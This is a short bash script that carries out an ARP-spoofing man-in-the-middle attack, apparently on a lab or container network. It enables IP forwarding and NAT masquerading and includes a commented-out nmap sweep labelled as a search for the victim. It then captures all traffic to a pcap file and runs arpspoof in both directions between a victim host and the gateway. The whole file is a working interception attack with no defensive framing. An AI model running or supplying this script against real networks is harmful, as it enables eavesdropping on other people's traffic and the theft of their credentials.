#!/bin/bash

# Enable IP forwarding to act like a router.
sysctl -w net.ipv4.ip_forward=1
# echo 1 > /proc/sys/net/ipv4/ip_forward
# cat /proc/sys/net/ipv4/ip_forward

# Add NAT
iptables -t nat -A POSTROUTING -j MASQUERADE

# Search for victim on the network
# nmap -sP 172.19.0.0/24

# Start capturing packets
tcpdump -i eth0 -Z root -w capture.pcap &

# Start ARP Spoofing
arpspoof -i eth0 -t 172.19.0.3 172.19.0.1 > /dev/null 2> /dev/null &
arpspoof -i eth0 -t 172.19.0.1 172.19.0.3 > /dev/null 2> /dev/null &

ping -c 1 172.19.0.3
